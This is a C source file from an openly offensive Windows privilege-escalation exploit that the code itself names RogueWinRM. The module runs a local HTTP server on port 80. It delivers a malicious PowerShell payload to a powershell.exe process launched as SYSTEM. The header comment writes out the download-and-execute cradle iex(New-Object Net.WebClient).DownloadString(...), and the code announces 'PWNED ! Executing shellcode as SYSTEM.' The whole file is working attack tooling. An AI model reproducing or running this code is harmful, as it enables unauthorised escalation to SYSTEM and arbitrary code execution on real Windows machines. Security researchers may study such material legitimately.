/**
	This module is a plain C class emulation. The POC written by decoder was in cpp and used some classes
	in  particular for the local negotiator.
	See https://stackoverflow.com/questions/40992945/convert-a-cpp-class-cpp-file-into-a-c-structure-c-file
	for how I emulated a class in pure C.

	This class defines the powershell delivery service and inherits from service.c (methods and arguments).
	The purpose of the whole exploit is to launch powershell.exe as SYSTEM and pass it the following argument:
	iex(New-Object Net.WebClient).DownloadString('http://127.0.0.1')
	This simple powershell line downloads whatever is served at 127.0.0.1 and execute it. This class is
	in charge of listening on port 80 in order to serve the malicious powershell payload (generated in powershell.c).
*/

#include "..\pch.h"

#define DEFAULT_BUFLEN 4096

/**
	Constructor of the powershellServer class. Setup the addresses of class methods,
	initialize some arguments, and call the constructor of base server (service.c)

	@param		powershellServer*	this			Address of the instantiated object.
	@param		char*				listen_address	Address of IP (as string)
	@param		char*				listen_port		Address of port (as string)
	@param		BOOL				debug			TRUE or FALSE. Defined in main/dllmain
 */
void initPowershellService(powershellServer* this, char* listen_address, char* listen_port, BOOL debug)
{
	this->destruct = &destructPowershellService;
	this->socketError = &pwshellSocketError;

	this->baseServer.construct = &initService;
	this->baseServer.construct(&this->baseServer, listen_address, listen_port, debug);

	return;
}



/**
	free allocated memory and call the destructor of base server (service.c)

	@param		powershellServer*	this	Address of the instantiated object.
 */
void destructPowershellService(powershellServer* this)
{
	this->baseServer.destruct(&this->baseServer);
	return;
}



/**
	Main entry point called by RunRogueWinRM. This function create a simple http server
	object by allocating memory for handle it, setting its constructor and calling it.
	Then, makes it listening for incoming connections.

	@param		char* powershellPayload		The malicious script generated in powershell.c
 */
void handlePowershellDeliveryService(char* powershellPayload)
{
	powershellServer Server;
	BOOL debug = TRUE;

	Server.construct = &initPowershellService;
	Server.construct(&Server, "127.0.0.1", "80", debug);

	handleHTTPConnection(&Server, powershellPayload);
}



/**
	Just listen for an incoming connection. This connection comes from powershell.exe which is
	executing the following code line: iex(New-Object Net.WebClient).DownloadString('http://127.0.0.1')

	@param		powershellServer*	this					Address of the instantiated object.
	@param		char*				powershellPayload		The malicious script generated in powershell.c
 */
static void handleHTTPConnection(powershellServer* this, char* powershellPayload)
{
	//variables for handling ntlm authentication over http
	char* http_response_packet = NULL;
	char recvbuf[DEFAULT_BUFLEN] = { 0 };
	int recvbuflen = DEFAULT_BUFLEN;
	int iResult = -1;

	iResult = recv(this->baseServer.socket, recvbuf, recvbuflen, 0);
	if (iResult <= 0) { this->baseServer.serverStop(&this->baseServer, -1, "Error while receiving data\n"); };
	dprintf("\nReceived http GET from powershell\n");
	if (this->baseServer.debug)
	{
		dprintf("\nHexdump of received packet:\n");
		hexDump2(NULL, recvbuf, iResult);
	}
	http_response_packet = forgePowershellDeliveryPacket(powershellPayload, this->baseServer.debug);

	dprintf("\n[+] PWNED ! Executing shellcode as SYSTEM.\n");
	iResult = send(this->baseServer.socket, http_response_packet, strlen(http_response_packet) * sizeof(char), 0);

	free(http_response_packet);
	http_response_packet = NULL;
	shutdown(this->baseServer.socket, SD_SEND);
	WSACleanup();
	return;
}




/**
	Create the HTTP response packet containing the malicious powershell script.
	Allocate memory, copy the HTTP headers and the data inside, annd returns
	a pointer to the heap region containing the packet.

	@param		char*		powershellPayload		The malicious script generated in powershell.c
	@param		BOOL		debug					TRUE or FALSE. Defined in main/dllmain
 */
static char* forgePowershellDeliveryPacket(char* powershellPayload, BOOL debug)
{
	const char http_headers[] =
		"HTTP/1.1 200 OK\r\n"
		"Keep-Alive: timeout=5, max=100\r\n"
		"Connection: Keep-Alive\r\n"
		"Accept-Ranges: bytes\r\n"
		"Server: Microsoft-HTTPAPI/2.0\r\n"
		"\r\n";
	char* http_response_packet = NULL;
	unsigned short packet_len = (unsigned short)strlen(http_headers) + (unsigned short)strlen(powershellPayload) + 1;

	http_response_packet = (char*)calloc(packet_len, sizeof(char));
	if (http_response_packet == NULL) exit(1);

	strcat_s(http_response_packet, packet_len, http_headers);
	strcat_s(http_response_packet, packet_len, powershellPayload);

	if (debug)
	{
		dprintf("\nHexdump of http_response_type2_packet:\n");
		hexDump2(NULL, http_response_packet, packet_len);
	}
	return http_response_packet;
}




/**
	In case of server error, properly stop thhe server and call the destructor.

	@param		powershellServer*	this				Address of the instantiated object
	@param		char*				error_message		Error message to be displayed
*/
static void pwshellSocketError(powershellServer* this, char* error_message)
{
	this->baseServer.serverStop(&this->baseServer, this->baseServer.socket, error_message);
}
